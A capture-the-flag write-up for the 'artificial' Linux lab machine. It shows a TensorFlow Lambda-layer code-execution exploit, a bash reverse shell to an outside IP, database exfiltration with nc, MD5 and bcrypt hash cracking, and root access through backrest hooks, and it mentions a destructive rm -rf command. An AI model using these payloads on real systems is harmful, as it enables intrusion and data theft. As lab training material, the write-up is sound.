`artificial` is an easy `linux` machine, hosting a website to upload and run `tenserflow` models, I got foothold by uploading and running a model with a malicious `lambda layer`, once inside I cracked some hashes from the website's `sqlite3` users database to get `ssh` credentials, then found a backup with credentials to an internal `web server` running as `root`, hosting `backrest webUI`, from there I took advantage of backrest hooks functionality to run arbitrary commands as root

# recon

I run `nmap` on the host to find `http` and `ssh` running
```bash
$ nmap -sSCV 10.10.11.74 -oA artificial

```

the web server also redirects to `artificial.htb` so I added the following entry to my `/etc/hosts` file

``` python
10.10.11.74	artificial.htb
```
## foothold as app

visiting the website I found the following page where I could `Build, test, and deploy AI models effortlessly with Artificial.`

![website.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/artificial/website.png)

I also found the following example code to train my own AI module
![example_code.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/artificial/example_code.png)

looking around, I found a register page at `/register`
![register.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/artificial/register.png)

I made an account and logged in, then I was greeted with a upload page to `upload my model`, at first I saved the example code to `test.py` and run it resulting in a new `profits_model.h5` file
``` bash
$ ls
test.py
$ python test.py
...
$ ls
profits_model.h5  test.py
```

I uploaded it on the website and got the following card
![view_predictions_button.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/artificial/view_predictions_button.png)

clicking on `View Predictions` did nothing, then I figured it's probably a python version mismatch, hence why they're giving both a `requirements` and a `docker` file, which I downloaded

I failed to use the requirements file, possibly because `I use arch btw`
``` bash
(venv) $ cat requirements.txt
tensorflow-cpu==2.13.1
(venv) $ pip install -r requirements.txt
ERROR: Could not find a version that satisfies the requirement tensorflow-cpu==2.13.1 (from versions: 2.20.0rc0, 2.20.0)
ERROR: No matching distribution found for tensorflow-cpu==2.13.1
```

so I built the docker container using their `dockerfile`, and mounted it under my `/tmp/lab` for convenience
``` bash
$ ls
Dockerfile  requirements.txt
$ docker build -t artificial .
...
$ docker run -v /tmp/lab:/tmp -it artificial
root@04e4cbf39ed3:/code# ls /tmp
test.py
```

from inside the I had to manually and install `pandas` python module, since the `dockerfile` only installed the `tensorflow-cpu`, then I successfully compiled the tenserflow model
```python
root@04e4cbf39ed3:/tmp# python test.py
Traceback (most recent call last):
  File "test.py", line 2, in <module>
    import pandas as pd
ModuleNotFoundError: No module named 'pandas'
root@04e4cbf39ed3:/tmp# pip install pandas
...
root@04e4cbf39ed3:/tmp# python test.py
...
root@04e4cbf39ed3:/tmp ls
__pycache__  profits_model.h5 test.py
```

I uploaded `profits_model.h5` file on the website, then the `View predictions` button worked, it went to `/run_model` and showed me the predictions
![normal_model_results.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/artificial/normal_model_results.png)

we can now run custom models, cool, now what?

now if there is any golden rule to security it's that user input is always dangerous if fully trusted, so I looked around how can I get `RCE` using `.h5` then I stumbled upon [this research](https://mastersplinter.work/research/tensorflow-rce/) that dissects `Tensorflow` Models and how they can be used to run arbitrary code

### Tensorflow Models are programs

from the [tensorflow security guideline](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md):
> TensorFlow models are expressed as programs that TensorFlow executes. TensorFlow programs are encoded as computation graphs ... using untrusted models or graphs is equivalent to running untrusted code.

the aforementioned research already explains how can we do so by using `Tensorflow` layers, TL;DR:
> Tensorflow Keras models are built using the “layers” which the library provides .. you can think of layers as functions which take an input and return a result. These functions are “chained” so that the output of the a layer is the input of the next one. Sorry to all the Data Scientists that are currently crying after reading this paragraph.


now according to the research there are a few layers that can be used, one of them is the `lambda` layer which allows *arbitrary Python expressions*  to be executed by the model, thus achieving code execution on the server

### testing the lambda layer in the docker container

I used the code presented in the link to generate a model that creates the `/tmp/pwn3d` file
``` python
import tensorflow as tf

def exploit(x):
    import os
    os.system("touch /tmp/pwned")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

and the following code to load the model
``` python
import tensorflow.keras

MODEL_PATH = "exploit.h5"

model = tensorflow.keras.models.load_model(MODEL_PATH)
```

I moved the files to my `/tmp/lab` and executed the following from my docker container

``` bash
root@04e4cbf39ed3:/tmp# ls
exploit.h5  exploit.py	load.py
root@04e4cbf39ed3:/tmp# python exploit.py
...
root@04e4cbf39ed3:/tmp# ls
exploit.h5  exploit.py	load.py  pwned
```

the research also mentions that the code in the `lambda layer` gets executed when compiling as well as the loading, hence why the file was created even before I load it, so it would be a very bad idea to compile a `lambda layer` that does something like `rm -rfv / --no-preserve-root`, this did bring some fake hope when I first got my reverse shell back, but it turned out I got it from my docker container xd

I deleted the file and run the loader just to make sure that the website will be able to execute the layer
``` bash
root@04e4cbf39ed3:/tmp# ls
exploit.h5  exploit.py	load.py  pwned
root@04e4cbf39ed3:/tmp# rm pwned
root@04e4cbf39ed3:/tmp# ls
exploit.h5  exploit.py	load.py
root@04e4cbf39ed3:/tmp# python load.py
...
root@04e4cbf39ed3:/tmp# ls
exploit.h5  exploit.py	load.py  pwned
```

bingo, now I just replaced the `touch` command `bash -c 'bash -i >& /dev/tcp/10.10.15.86/10000 0>&1'`, compiled the model and uploaded it to the website to view "my predictions" then got a reverse shell as `app`

``` bash
$ nc -lnvp 10000
Connection from 10.10.11.74:34884
bash: cannot set terminal process group (816): Inappropriate ioctl for device
bash: no job control in this shell

```

## ssh as gael

after getting a shell I found `sqlite3` users database under `app`'s home directory

``` bash
app@artificial:~/app$ file instance/users.db
file instance/users.db
instance/users.db: SQLite 3.x database, last written using SQLite version 3031001
```

I downloaded it to my machine using `nc` and found a few hashes inside

#### on the target machine
``` bash
app@artificial:~/app$ nc 10.10.15.86 20000 < instance/users.db
```

#### on my machine

```bash

```

the 6th hash was mine, 7th was probably another player's, they seemed like `md5` hashes but I checked to the source code just to make sure, I `grep`'d for the the keyword `passowrd` and found the following line in `app.py`
``` bash
app@artificial:~/app$ grep password * -n
...
app.py:89:        hashed_password = hash(password)
app.py:97:        new_user = User(username=username, email=email, password=hashed_password
...
```

I checked the `hash_password` function and I found the following code
``` python
def hash(password):
	password = password.encode()
	hash = hashlib.md5(password).hexdigest()
	return hash
```

so it's definitely `md5` which I used `john` to crack
```bash
$ john w --format=Raw-MD5 --wordlist=$ROCK
Using default input encoding: UTF-8
Loaded 5 password hashes with no different salts (Raw-MD5 [MD5 128/128 AVX 4x3])

```

I have a little issue sometimes with `john` where it doesn't show the usernames, so I used `nxc` to spray those passwords, normally I can just grab the hash from `john`'s pot file (`$HOME/.john/john.pot`) but I wanted to try the ssh spraying `module` in `nxc`

```bash
$ nxc ssh artificial.htb -u w -p pass --continue-on-success

then logged in the grab the user flag

I checked open ports and found `9898` open internally

```

I used ssh local portforward (`ssh -L 9898:127.0.0.1:9898`) to expose the port to my machine, and found a [backrest](https://github.com/garethgeorge/backrest) (which is basically a UI for taking backups) there asking for credentials
![backrest.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/artificial/backrest.png)

I also found the backrest service fines under `/opt`, with a hidden `json` config file but my user didn't have the permissions to read it

```bash
gael@artificial:~$ ls /opt/backrest/ -a
.   backrest  install.sh  oplog.sqlite       oplog.sqlite-shm  processlogs  tasklogs
..  .config   jwt-secret  oplog.sqlite.lock  oplog.sqlite-wal  restic
gael@artificial:~$ cat /opt/backrest/.config/backrest/config.json
cat: /opt/backrest/.config/backrest/config.json: Permission denied
```

then I checked the groups `gael` is a member of and found `sysadm` which caught my attention, so I looked for files owned by that group, and found a `backrest` backup
```bash
gael@artificial:/$ groups
gael sysadm
gael@artificial:/$ find / -group sysadm 2>/dev/null
/var/backups/backrest_backup.tar.gz
```

funnily enough, that file was a `tar` archive, even tho it had `.tar.gz` extension
```bash
gael@artificial:~$ mkdir /tmp/lab
gael@artificial:~$ cp /var/backups/backrest_backup.tar.gz /tmp/lab
gael@artificial:~$ cd /tmp/lab
gael@artificial:/tmp/lab$ ls
backrest_backup.tar.gz
gael@artificial:/tmp/lab$ file backrest_backup.tar.gz

gael@artificial:/tmp/lab$ tar xf backrest_backup.tar.gz
gael@artificial:/tmp/lab$ ls

backrest    jwt-secret    oplog.sqlite.lock  oplog.sqlite-wal  restic
install.sh  oplog.sqlite  oplog.sqlite-shm   processlogs       tasklogs
```

this was pretty much the same stuff I found under `/opt/backrest` except that the config file was readable this time, inside it I found a `base64`ed `bcrypt` hash

```bash
gael@artificial:/tmp/lab$ cat backrest/.config/backrest/config.json
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
gael@artificial:/tmp/lab$  echo JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP | base64 -d

```

which again I used `john` to crack

``` bash
$ john backrest.bcrypt --format=Raw-MD5 --wordlist=$ROCK

```

then I logged in to backrest using `backrest_root:!@#$%^` and got the following dashboard
![backrest_login_dashboard.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/artificial/backrest_login_dashboard.png)

checking [backrest wiki](https://garethgeorge.github.io/backrest/), I found that you can setup hooks that execute commands when certain events happens, such as the start of a backup, end of a backup etc ..

you can also create a set of rules that define a backup operation, along with its associated hooks, defined by backrest as a `repository`
![backrest_repository_definition.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/artificial/backrest_repository_definition.png)

with this knowledge I added a dummy repository
![new_repo.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/artificial/new_repo.png)

and configured it such as it creates `setuid` shell binary when the repository is pruned 
![repo_config.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/artificial/repo_config.png)

and saved the repository

![priv_esc_repo.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/artificial/priv_esc_repo.png)

then I went to its settings and clicked `prune now`
![prune_now.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/artificial/prune_now.png)

then got my root shell, and grabbed the root flag
